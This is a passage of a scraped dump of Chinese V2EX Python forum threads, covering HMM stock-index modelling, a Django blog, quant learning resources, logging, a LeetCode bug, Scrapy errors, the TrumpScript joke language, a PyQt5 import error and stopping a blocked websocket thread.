分享自己的研究策略提出致谢。</p>\n<p>HMM_Model_Modified_3_Hidden_States.ipynb</p>\n<p>以下为从“ HMM 在股票上的简单应用”一文中获得的源代码，其中唯一的修改是隐藏状态数从 6 变为 3 。</p>\n<p>In [ ]:</p>\n<pre><code>from hmmlearn.hmm import GaussianHMM\nimport numpy as np\nfrom matplotlib import cm, pyplot as plt\nimport matplotlib.dates as dates\nimport pandas as pd\nimport datetime\n\nfrom scipy import stats # To perfrom box-cox transformation\nfrom sklearn import preprocessing # To center and standardize the data.\n\n# Source Code from previous HMM modeling\n\n# Note that numbers of hidden states are modified to be 3, instead of 6.\n\nbeginDate = '2005-01-01'\nendDate = '2015-12-31'\nn = 3 # Hidden states are set to be 3 instead of 6\ndata = get_price('CSI300.INDX',start_date=beginDate, end_date=endDate,frequency='1d')\ndata[0:9]\n\nvolume = data['TotalVolumeTraded']\nclose = data['ClosingPx']\n\nlogDel = np.log(np.array(data['HighPx'])) - np.log(np.array(data['LowPx']))\nlogDel\n\nlogRet_1 = np.array(np.diff(np.log(close)))#这个作为后面计算收益使用\nlogRet_5 = np.log(np.array(close[5:])) - np.log(np.array(close[:-5]))\nlogRet_5\n\nlogVol_5 = np.log(np.array(volume[5:])) - np.log(np.array(volume[:-5]))\nlogVol_5\n\nlogDel = logDel[5:]\nlogRet_1 = logRet_1[4:]\nclose = close[5:]\nDate = pd.to_datetime(data.index[5:])\n</code></pre>\n<p>通过直方图来观察所选指标（可观测序列）分布的正态性。其中第一个指标（每日最高最低价格的对数差值）明显偏离正态分布。</p>\n<p>In [53]:</p>\n<pre><code># the histogram of the raw observation sequences\n\nn, bins, patches = plt.hist(logDel, 50, normed=1, facecolor='green', alpha=0.75)\n\nplt.show()\n\nn, bins, patches = plt.hist(logRet_5, 50, normed=1, facecolor='green', alpha=0.75)\n\nplt.show()\n\nn, bins, patches = plt.hist(logVol_5, 50, normed=1, facecolor='green', alpha=0.75)\n\nplt.show()\n</code></pre>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=EJC5kfalG&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=NyI3kz6ef&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=NJZylz6gM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p>In [ ]:</p>\n<pre><code>通过 Box-Cox Transformation 来对第一个指标进行调整，使其更接近正态分布。\n\n同时对三个指标的分布进行标准化（调整其均值为 0 ，且标准差调整为 1 ），保证指标在参数估计中具有大致相等的权重。\n</code></pre>\n<p>In [54]:</p>\n<pre><code># Box-Cox Transformation of the observation sequences\n\nboxcox_logDel, _ = stats.boxcox(logDel)\n\n# Standardize the observation sequence distribution\n\nrescaled_boxcox_logDel = preprocessing.scale(boxcox_logDel, axis=0, with_mean=True, with_std=True, copy=False)\n\nrescaled_logRet_5 = preprocessing.scale(logRet_5, axis=0, with_mean=True, with_std=True, copy=False)\n\nrescaled_logVol_5 = preprocessing.scale(logVol_5, axis=0, with_mean=True, with_std=True, copy=False)\n\n# the histogram of the rescaled observation sequences\n\nn, bins, patches = plt.hist(rescaled_boxcox_logDel, 50, normed=1, facecolor='green', alpha=0.75)\n\nplt.show()\n\nn, bins, patches = plt.hist(rescaled_logRet_5, 50, normed=1, facecolor='green', alpha=0.75)\n\nplt.show()\n\nn, bins, patches = plt.hist(rescaled_logVol_5, 50, normed=1, facecolor='green', alpha=0.75)\n\nplt.show()\n</code></pre>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=4kRxWG6eM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=Ey_zZG6lf&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=Ekwmbfalf&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p>In [55]:</p>\n<pre><code># Observation sequences matrix \nA = np.column_stack([logDel,logRet_5,logVol_5]) \n\n# Rescaled observation sequences matrix \nrescaled_A = np.column_stack([rescaled_boxcox_logDel, rescaled_logRet_5, rescaled_logVol_5]) \n</code></pre>\n<p>对于未修正的指标进行隐马尔科夫链建模。</p>\n<p>In [64]:</p>\n<pre><code># HMM modeling based on raw observation sequences\n\nmodel = GaussianHMM(n_components= 3, covariance_type=\"full\", n_iter=2000).fit([A])\nhidden_states = model.predict(A)\nhidden_states\n\nplt.figure(figsize=(25, 18)) \nfor i in range(model.n_components):\n    pos = (hidden_states==i)\n    plt.plot_date(Date[pos],close[pos],'o',label='hidden state %d'%i,lw=2)\n    plt.legend(loc=\"left\")\n</code></pre>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=4yCGGzpgM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p>In [67]:</p>\n<pre><code>for i in range(3):\n    pos = (hidden_states==i)\n    pos = np.append(0,pos[:-1])#第二天进行买入操作\n    df = res.logRet_1\n    res['state_ret%s'%i] = df.multiply(pos)\n    plt.plot_date(Date,np.exp(res['state_ret%s'%i].cumsum()),'-',label='hidden state %d'%i)\n    plt.legend(loc=\"left\")\n</code></pre>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=VyaoGGpgM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p>In [83]:</p>\n<pre><code>long = (hidden_states==0)  #做多\nshort = (hidden_states == 1)  #做空\nlong = np.append(0,long[:-1]) #第二天才能操作\nshort = np.append(0,short[:-1]) #第二天才能操作\n\nres['ret'] =  df.multiply(long) - df.multiply(short)  \nplt.plot_date(Date,np.exp(res['ret'].cumsum()),'r-')\n</code></pre>\n<p>Out [83]:[&lt;matplotlib.lines.Line2D at 0x7fc541b9d1d0&gt;]</p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=VkowQf6lf&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p>In [ ]:</p>\n<pre><code>对修正后的指标进行隐马尔科夫链建模。\n</code></pre>\n<p>In [71]:</p>\n<pre><code># HMM modeling based on processed observation sequences\n\nrescaled_model = GaussianHMM(n_components= 3, covariance_type=\"full\", n_iter=2000).fit([rescaled_A])\nrescaled_hidden_states = rescaled_model.predict(rescaled_A)\nrescaled_hidden_states\n\nplt.figure(figsize=(25, 18)) \nfor i in range(model.n_components):\n    pos = (rescaled_hidden_states==i)\n    plt.plot_date(Date[pos],close[pos],'o',label='hidden state %d'%i,lw=2)\n    plt.legend(loc=\"left\")\n</code></pre>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=EJJJNzaxG&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p>In [73]:</p>\n<pre><code>for i in range(3):\n    pos = (rescaled_hidden_states==i)\n    pos = np.append(0,pos[:-1])#第二天进行买入操作\n    df = res.logRet_1\n    res['state_ret%s'%i] = df.multiply(pos)\n    plt.plot_date(Date,np.exp(res['state_ret%s'%i].cumsum()),'-',label='hidden state %d'%i)\n    plt.legend(loc=\"left\")\n</code></pre>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=EyUQEM6gM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p>In [74]:</p>\n<pre><code>long = (rescaled_hidden_states==0)  #做多\nshort = (rescaled_hidden_states==1) + (rescaled_hidden_states == 2)  #做空\nlong = np.append(0,long[:-1]) #第二天才能操作\nshort = np.append(0,short[:-1]) #第二天才能操作\n\nres['ret'] =  df.multiply(long) - df.multiply(short)  \nplt.plot_date(Date,np.exp(res['ret'].cumsum()),'r-')\n</code></pre>\n<p>Out [74]:[&lt;matplotlib.lines.Line2D at 0x7fc541b4fe48&gt;]</p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=NkgK4Gplf&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<h3><strong>新鲜出品： <a href=\"https://www.ricequant.com/community/topic/822/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/822/?utm_source=v2ex</a></strong></h3>\n<h3>写完以后累死 word 姐了~</h3>\n</div></div>"], "reply": "1", "tittle": "隐马尔科夫链模型对于沪深 300 指数建模的进一步研究", "comment": ["搞笑还是可以的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近花时间学习了一下 Django 开发。学习了一下怎样在 pythonanywhere 下部署。代码很简单，也借鉴了不少。希望对有志于学习 python 后端的同学有所帮助，一起交流提高。共同开发。</p>\n<p>演示地址： <a href=\"http://vino.pythonanywhere.com/\" rel=\"nofollow\">http://vino.pythonanywhere.com/</a></p>\n<p>代码在这里： <a href=\"https://github.com/wuchangfeng/Vino\" rel=\"nofollow\">https://github.com/wuchangfeng/Vino</a></p>\n<p><img alt=\"\" src=\"http://ww3.sinaimg.cn/large/b10d1ea5jw1f9gdiwpetlj21kw0zkn3z.jpg\">\n<img alt=\"\" src=\"http://ww3.sinaimg.cn/large/b10d1ea5jw1f9gdj8e8q6j21kw0zkgsp.jpg\"></p>\n</div></div>"], "reply": "23", "tittle": "小弟学习 Django 写了个博客，一起学习共同进步。", "comment": ["这是一条扯淡的评论，这是一条扯淡的评论，这是一条扯淡的评论，这是一条扯淡的评论，这是一条扯淡的评论，这是一条扯淡的评论，这是一条扯淡的评论，这是一条扯淡的评论，这是一条扯淡的评论，这是一条扯淡的评论", "很不错，这是自己刚刚用 django 搭的，前端完全照抄 DIYgod 的主页，共勉...\r", " @", " 哇，这个简直炫酷，开源吗或者留个方式交流学习。", " 厉害了，真的是一模一样...但是干嘛去掉我的链接...", " 哥们，可以的话，加个我 qq 啊，学习一下 437806668", " 还真是……\r", " ", " 点进去还是 debug 页面，当时修改主题时对所有链接做了#处理，哈哈我马上补上", " 没事，真的是一模一样哈哈哈", " \r", "具体借鉴\r", "DIYgod 的 ", "\r", "django 构建博客系统 ", "\r", "当时修改主题的经历 ", "Python 从入门到放弃", " 哇哦 github 主页太炫酷了", "一看到 Python 我就有兴趣，也来晒晒我的，共同学习：\r", "\r", "博客： ", "\r", "社区： ", "\r", "\r", "都是个人边学习边造的轮子", "忘了， www 被墙了， ", " 这个好像没有", "我日 我的也做到一半了", "请问 python 和 Django 的版本是？", "在 github 上看到了。\r", "开发工具 Pycharm\r", "部署平台 pythonanywhere\r", "开发环境 python3.5 + Django 1.9", "我的虚拟环境老是出问题，教教我如何解决啊。刚看完 djiangogirls 。你们的博客太好看了，给我参考哈源码呗，菜鸟学习中！", " 虚拟环境什么问题？无法安装还是无法激活？我开始的教程也是看 djangogirls 的，就是按照上面的教程一步一步来的。源码在这里 ", " 哥们，博客开源么，想学习一下", " \r", " \r", "源码:https://github.com/sfantree/lightstar", " 太感谢了，哥们，好感到~~", "\r", "\r", "我也来发一个， Django 1.10 和 Python3 开发的"]},
{"content": ["<div class=\"topic_content\">我发现很多懂金融的人不懂量化，前些日子有位哥们私信我说想多看一下量化的入门资料。我想了很久，整理了一些平时我自己学 Python 的教材，希望对各位 V 友有用哈：）\r<br>\r<br>量化分析师的 Python 日记 [第 1 天：谁来给我讲讲 Python ？]  <a target=\"_blank\" href=\"https://uqer.io/community/share/55e913a5f9f06c1ea681f9e8\" rel=\"nofollow\">https://uqer.io/community/share/55e913a5f9f06c1ea681f9e8</a>\r<br>量化分析师的 Python 日记 [第 2 天：再接着介绍一下 Python 呗] \r<br><a target=\"_blank\" href=\"https://uqer.io/community/share/54c8af17f9f06c276f651a54\" rel=\"nofollow\">https://uqer.io/community/share/54c8af17f9f06c276f651a54</a>\r<br>量化分析师的 Python 日记 [第 3 天：一大波金融 Library 来袭之 numpy 篇] \r<br><a target=\"_blank\" href=\"https://uqer.io/community/share/54ca15f9f9f06c276f651a56\" rel=\"nofollow\">https://uqer.io/community/share/54ca15f9f9f06c276f651a56</a>\r<br>量化分析师的 Python 日记 [第 4 天：一大波金融 Library 来袭之 scipy 篇] \r<br><a target=\"_blank\" href=\"https://uqer.io/community/share/54d83bb3f9f06c276f651a6e\" rel=\"nofollow\">https://uqer.io/community/share/54d83bb3f9f06c276f651a6e</a>\r<br>量化分析师的 Python 日记 [第 5 天：数据处理的瑞士军刀 pandas ] \r<br><a target=\"_blank\" href=\"https://uqer.io/community/share/54ffd96ef9f06c276f651aac\" rel=\"nofollow\">https://uqer.io/community/share/54ffd96ef9f06c276f651aac</a>\r<br>量化分析师的 Python 日记 [第 6 天：数据处理的瑞士军刀 pandas 下篇 ] \r<br><a target=\"_blank\" href=\"https://uqer.io/community/share/5514bb11f9f06c12790415b2\" rel=\"nofollow\">https://uqer.io/community/share/5514bb11f9f06c12790415b2</a>\r<br>量化分析师的 Python 日记 [第 7 天： Q Quant 之初出江湖] \r<br><a target=\"_blank\" href=\"https://uqer.io/community/share/5514fc98f9f06c8f33904449\" rel=\"nofollow\">https://uqer.io/community/share/5514fc98f9f06c8f33904449</a></div>"], "reply": "11", "tittle": "从金融到量化", "comment": ["mark", "想发展这个方向， mark", " 恩恩，蟹蟹哈", " 恩恩，蟹蟹哈", "顶一下！！", "找工作就是个坑，不如发基金产品，要么自己做交易。", "mark", "马克", "感谢分享，最近在看 python for finance 这本书，要学的东西还是蛮多的～", " 恩恩， Yves Hilpisch 写的对吧，这本是 python 们的圣经：）", "这是参考数说工作室的么?"]},
{"content": ["<div class=\"topic_content\">我是 python 菜鸟一个，目前按照网上的教程自己建了个博客放在 pythonanywhere 上，没有接触过真正的生产项目。不知道真正的项目 debug 是怎样的？ log 是如何写的？</div>"], "reply": "7", "tittle": "生产环境中， log 是怎么写的？直接写在生产的代码中吗？", "comment": ["项目上线前要 debug ，线上出 bug 了就只能靠日志了， error 级别达到 sentry ， info 级别打到 logstash", "就是写在生产代码里啊, 只不过分级别打印, 不会打印的太详细而已.", "java 世界一般都用 aop 将非业务核心代码分离，我觉得 py 可能也有自己的办法…", " 个人觉得即使是分离, 那部分日志的代码也还是属于生产的代码, 只不过与业务代码在函数 /类 /文件层面拆开了而已. 如果也想这么做的话, Python 可以用 decorator 之类实现类似的功能.", "日志和配套的收集、归档、监控、告警都是生产环境的重要组成部分", " 嗯。现在 debug 还是写 print", "在你觉得会出问题的地方都加上日志，前期不要怕打多，多了还能挑，少了基本就大海捞针了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>python\n\n# Definition for a binary tree node.\n# class TreeNode(object):\n#     def __init__(self, x):\n#         self.val = x\n#         self.left = None\n#         self.right = None\n\nclass Solution(object):\n    def sumOfLeftLeaves(self, root):\n        \"\"\"\n        :type root: TreeNode\n        :rtype: int\n        \"\"\"\n        if root is None or self.isleaf(root):\n            return 0\n        if self.isleaf(root.left):\n            return root.left.val + self.sumOfLeftLeaves(root.right)\n        else:\n            return self.sumOfLeftLeaves(root.left) + self.sumOfLeftLeaves(root.right)\n        \n    def isleaf(self,root):\n        return root.left is None and root.left is None\n</code></pre>\n<p>原题地址是 <a href=\"https://leetcode.com/problems/sum-of-left-leaves/\" rel=\"nofollow\">https://leetcode.com/problems/sum-of-left-leaves/</a>\n求解，这段代码哪里写错了？</p>\n</div></div>"], "reply": "7", "tittle": "Python 求二叉树所有左叶节点的和", "comment": ["按我的理解， left leaves != left node\r", "\r", "~~~python\r", "def is_leaf(self, node):\r", "    return node is not None and node.left is None and node.right is None", " 是的，求的是所有左叶节点的和。\r", "node is not None 的判断在最开始就做了。\r", "\r", "错误样例是\r", "[0,2,4,1,null,3,-1,5,1,null,6,null,8]\r", "算这个的时候错了", "他不是要你算左叶子节点么？你的代码包含了非叶子节点在里面", "return root.left is None and root.left is None\r", "\r", "看了好几遍不知道在干嘛。\r", "难道不是 return root is not None and root.left is None and root.right is None 吗？", " 我擦，看出来了，把第二个自判断也写成 left 了。。\r", "晕，太马虎了", " 是我发现写错了。多谢多谢", "def isleaf(self,root):\r", "        return root.left is None and root.left is None 不应该是 right 吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>新鲜出品 <a href=\"https://www.ricequant.com/community/topic/1958/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/1958/?utm_source=v2ex</a></h2>\n<p>[金融与市场] 效用函数.ipynb\n金融学的核心问题是资源的有效配置，而资源配置的效率主要体现在两个层面。</p>\n<p>在微观层面，配置效率关注的是经济参与者（包括个体、公司或政府）如何使用他们所拥有的资源来最优地满足他们的经济需要。</p>\n<p>在宏观层面，配置效率关注的是稀缺资源如何流向最能产生价值的地方。资源的配置是通过在市场特别是金融市场上的交易来完成的，金融市场是交易金融要求权即对未来资源的要求权的场所。因此，金融学关注的焦点是金融市场在资源配置中的作用和效率。具体而言，它分析的是每一个市场参与者如何依赖金融市场达到资源的最优利用，以及市场如何促进资源在参与者之间进行有效配置。</p>\n<p>本系列的目标是为这样的分析建立一个基本理论框架以及一系列的基本概念和原理，并运用这个框架以及相应的概念和原理对以下三个相关连的问题作具体的分析：\n（ 1 ）个体参与者如何作出金融决策，尤其是在金融市场中的交易决策。\n（ 2 ）个体参与者的这些决策如何决定金融市场的整体行为，特别是金融要求权的价格。\n（ 3 ）这些价格如何影响资源的实际配置</p>\n<pre><code>本文由 RiceQuant 量化课堂推出。\n难度：易\n阅读本文需要掌握概率论、实变函数基础的知识。  \n\n编辑：千棘万里花\n</code></pre>\n<p>本文是一系列文章中的第一篇。本系列从基础概念入手，推导出 CAPM 模型。</p>\n<p>1.效用模型</p>\n<p>2.风险模型</p>\n<p>3.MPT 模型</p>\n<p>4.CAPM 模型</p>\n<p>5.套利和资产定价</p>\n<p>本文将介绍效用的模型，解释我们对价值的衡量标准，并在该模型中分析我们面对不确定性时的决策。</p>\n<p>偏好\n参与者的经济需求是由他对于不同消费计划的偏好(preference)来描述的。所谓偏好就是参与者对所有可能消费计划的一个排序。这样的排序定义了他的经济需求。偏好的定义如下。</p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=4kL4cO0gz&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111117\"></p>\n<p><strong>效用函数</strong></p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=Ek9_5d0gM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111117\"></p>\n<p>用人话举个例子，假设 d 是一万元， x 是二十万， y 是二十亿，这就是说当我们的总资产只有二十万的时候，一万元钱提供的效用比我们有二十亿时要大。这也是符合逻辑的，因为当我们只有二十万时，一万的额外资金可以用来做很多事情，但当我们有二十亿的时候，一万元已经无足轻重。 如果一个效用函数满足以上两个性质，我们说它是“正常”的，因为大多数人都要会符合这些性质。并且，在绝大多数经济学理论中，我们都会假设投资者的效用函数是“正常”的。</p>\n<p>如果将一个“正常”的效用函数 u 画成图的话，这两个性质在图上表现出来的就是：一，效用曲线是上升的；二，效用曲线的上升越来越慢。</p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=4yQ65ORef&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111117\">\n<img alt=\"\" src=\"http://yotuku.cn/link?url=41qkidAgz&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111117\">\n<img alt=\"\" src=\"http://yotuku.cn/link?url=Ey7fidAgM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111117\"></p>\n<p><strong>预期效用假说</strong>\n<img alt=\"\" src=\"http://yotuku.cn/link?url=VyoDj_0xG&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111117\">\n投资者无时不刻不在面临很多选项。有时这些选项可能结果是固定的，比如将钱存入银行；有时可能是不固定的，比如买入风险资产。预期效用假说的意思是，不论投资者的选项是什么，他必定会选择将自己的预期效用最大化的那个选项。</p>\n<p>如果抉择的结果全部是固定的，问题并不复杂，我们可以直接选择货币价值最高的那个。但如果结果是不确定的，那么相互比较就比较困难；在这个假说之下，我们可以用效用模型来分析对于不确定性的抉择。\n<img alt=\"\" src=\"http://yotuku.cn/link?url=41EyndAxM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111117\">\n得知进行投资的预期效用小于什么都不做的效用，因此不应该选择投资。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "[金融与市场]效用函数", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Scrapy 项目中有多个 spider ，某些 spider 在处理 response 的时候会出现异常（如 xpath 解析后得到空的 list ，这时去 list[n]的时候就会抛 Indexerror ），有没有什么办法可以统一管理这些异常？\n自己写 SpiderMiddleware ， spider 抛出异常的时候 process_spider_exception 方法并没有被触发......\n求建议~</p>\n</div></div>"], "reply": "3", "tittle": "关于统一处理 Scrapy spider 异常的问题", "comment": ["pycharm 调试下流程就好了.", "scrapy,直接看源码的,很清楚的", "可以参考一下这个\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/samshadwell/TrumpScript\" rel=\"nofollow\">https://github.com/samshadwell/TrumpScript</a></p>\n<blockquote>\n</blockquote>\n<h2>Features</h2>\n<p>Our language includes several convenient features, perfect for any aspiring Presidential candidate including:</p>\n<ul>\n<li>No floating point numbers, only integers. America never does anything halfway.</li>\n<li>All numbers must be strictly greater than 1 million. The small stuff is inconsequential to us.</li>\n<li>There are no import statements allowed. All code has to be home-grown and American made.</li>\n<li>Instead of <code>True</code> and <code>False</code>, we have the keywords <code>fact</code> and <code>lie</code>.</li>\n<li>Only the most popular English words, Trump's favorite words, and current politician names can be used as variable names.</li>\n<li>Error messages are mostly quotes directly taken from Trump himself.</li>\n<li>All programs must end with <code>America is great</code>.</li>\n<li>Our language will automatically correct Forbes' $4.5B to $10B.</li>\n<li>In its raw form, TrumpScript is not compatible with Windows, because Trump isn't the type of guy to believe in PC.</li>\n<li>TrumpScript boycotts OS X and all Apple products  until such time as Apple gives cellphone info to authorities regarding radical Islamic terrorist couple from Cal.</li>\n<li>The language is completely case insensitive.</li>\n<li>If the running computer is from China, TrumpScript will not compile. We don't want them stealing our American technological secrets.</li>\n<li>By constructing a wall (providing the --Wall flag), TrumpScript will refuse to run on machines with Mexican locales</li>\n<li>Warns you if you have any Communists masquerading as legitimate \"SSL Certificates\" from China on your system.</li>\n<li>Won't run in root mode because America doesn't need your help being great. Trump is all we need.</li>\n<li>Easy to type with small hands</li>\n</ul>\n<p>如何评价 python 开发者的创造力？</p>\n</div></div>"], "reply": "10", "tittle": "TrumpScript: Make Python great again", "comment": ["\"Detected commie network, aborting.\"\r", "\r", "![]( ", " )", "十分幽默 已经 4.7k+ stars 了", " \r", "\r", "```\r", "\r", " +    def no_commie_network() -> None:\r", " +        \"\"\"\r", " +        Make sure we aren't running on commie Chinese networks.\r", " +        \"\"\"\r", " +        freedom_host = \"facebook.com\"\r", " +        commie_host = \"alibaba.cn\"\r", " +        is_on_a_network = os.system(\"ping -c 1 {}\".format(commie_host)) == 0\r", " +        is_commie_network = os.system(\"ping -c 1 {}\".format(freedom_host)) != 0\r", " +        if is_on_a_network and is_commie_network:\r", " +            raise Utils.SystemException(\"Detected commie network, aborting.\")\r", "\r", "```\r", "\r", "是这样判断的", " 汗。。我刚还上 vps 去运行。\r", "改了下源码能正常运行了。看了一下 issue 里面的内容，没看懂这个幽默， Get 不到笑点。。。可以帮忙解释一下吗？", "哈哈，有意思。", "这代码政治非常不正确。", "\r", "\r", "+1s", " 这本来就是个搞事的  你还真当轮子了么 ....... 笑点这东西 可能我说了你还是不懂笑点......", " 没把它当轮子，我把里面的内容理解为恶搞或者是政治讽刺。没有经历过理解不到笑点。", " 主要就是川普的几次演讲 还有他的政治观点 最后是他的口号之类的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>msvcp71.dll 与 msvcr71.dll 已装，然并卵。\n不是伸手党，参考了很多别人的解决方案，还是没明白，并且问题也没有解决。\nwin10 下 python3.5 导入 pyqt5 报错：</p>\n<pre><code>    File \"F:/python/Growth/test.py\", line 1, in &lt;module&gt;\n    from PyQt5.QtCore import QMimeDatabase\n    ImportError: DLL load failed: 找不到指定的程序。\n\n为什么使用 pip 安装的 pyqt5 的包， python 自己却找不到？这个问题该如何解决？谢谢！\n</code></pre>\n</div></div>"], "reply": "目前尚无回", "tittle": "ImportError: DLL load failed: 找不到指定的程序。此坑求帮填！！！", "comment": []},
{"content": ["<div class=\"topic_content\">我的程序创建了一个线程在后台接收消息，  \r<br>\r<br>def   threadFunc():\r<br>\r<br>        ....dosomework\r<br>\r<br>       while self._active:\r<br>                 message = yield from   wsclient.recv()\r<br>                 ...dosomework\r<br>\r<br>       .....\r<br>\r<br>\r<br>我的程序要关闭， 所以想通知这个线程退出， 所以， 我在外面 设置 上面这个 while 的判断标志 self._active 为 False ，希望下个循环就退出线程。\r<br>\r<br>但是问题是， 如果一段时间， recv 没有数据读的时候， wsclient.recv() 这个地方会一直阻塞住了， 不会去调 while 的下一次循环。。。。\r<br>\r<br>有什么方法可以退出呢？ 这个能设置一个 timeout 吗？ 我尝试在创建得到 wsclient 的时候 wsclient.settimeout(3) 好像这个 recv 还是会阻塞住。\r<br>\r<br>而 Python 又不能像 c++那样，直接粗暴的 terminate thread ， 请问， 有什么好的办法吗？</div>"], "reply": "11", "tittle": "Python 多线程 Websockets 退出出错", "comment": ["你直接用 CTRL+C 终止的话， wsclient.recv()应该会触发中断异常才对。", "我不是专门的 Python 程序员，查了一下， Python 里面的信号默认只会被主线程捕获，猜测应该是对子线程设置了 signal mask 。\r", "楼主或许可以尝试这两个方法：\r", "1. 主线程中处理 SIG_INT ，强制终止子线程。\r", "2. 或者在子线程中设置一个 bool 变量，每次循环前检查 bool 变量的值决定继续执行或退出。", "    你可能没仔细看上面的帖子， 也可能我没说清楚。\r", "\r", "1. python 不像 c++那样提供强制退出线程的函数。 有的时候，你 CTRL+C ，主程序退出了， 你用 Process Monitor 海能看到有代码在跑。\r", "\r", "2. 我设置了这样的变量让他退出， 现在关键是 recv 那个函数阻塞住不返回， 也就不会去访问那个变量。我尝试设置超时，也可能是我设置有问题。 对 Python 的异步还没完全搞明白。", "标准库里的 signal 模块可以添加处理函数", "我去 Google 查了一下， Python 的线程实现有一些奇怪的行为。\r", "比如，主线程如果 block 在 thread.join()上，是不能捕获消息的（可能和全局解释器锁有关）。\r", "\r", "我拿 StackOverflow 上的一个不通的示例代码作了些修改，使 CTRL+C 可以成功工作了（这里在主线程中调用 signal.pause()等待 SIGINT ， join()不行）：\r", "\r", " import signal, sys, threading, time\r", " \r", " THREADS = []\r", " \r", " def handler(signal, frame):\r", "     global THREADS\r", "     print \"Ctrl-C.... Exiting\"\r", "     for t in THREADS:\r", "         t.alive = False\r", "     sys.exit(0)\r", " \r", " class thread(threading.Thread):\r", "     def __init__(self):\r", "         self.alive = True\r", "         threading.Thread.__init__(self)\r", " \r", " \r", "     def run(self):\r", "         n = 0\r", "         while self.alive:\r", "             n = n + 1\r", "             print(\"round %s\" %n)\r", "             time.sleep(1)\r", "             pass\r", " \r", " def main():\r", "     global THREADS\r", "     t = thread()\r", "     t.start()\r", "     THREADS.append(t)\r", "     signal.pause()\r", "     for t in THREADS:\r", "         t.join()\r", " \r", " if __name__ == '__main__':\r", "     signal.signal(signal.SIGINT, handler)\r", "     main()\r", "\r", "\r", "一些资料：\r", "\r", "\r", "关于 socket 的 setTimeout()，我没有测试，应该是不会有问题的。怀疑主线程没有捕获到 SIGINT 。", "好像还是用抛异常来解决超时杀线程比较方便\r", "\r", "\r", "import threading\r", "import time\r", "import inspect\r", "import ctypes\r", "\r", "def _async_raise(tid, exctype):\r", "    \"\"\"raises the exception, performs cleanup if needed\"\"\"\r", "    tid = ctypes.c_long(tid)\r", "    if not inspect.isclass(exctype):\r", "        exctype = type(exctype)\r", "    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))\r", "    if res == 0:\r", "        raise ValueError(\"invalid thread id\")\r", "    elif res != 1:\r", "        # \"\"\"if it returns a number greater than one, you're in trouble,\r", "        # and you should call it again with exc=NULL to revert the effect\"\"\"\r", "        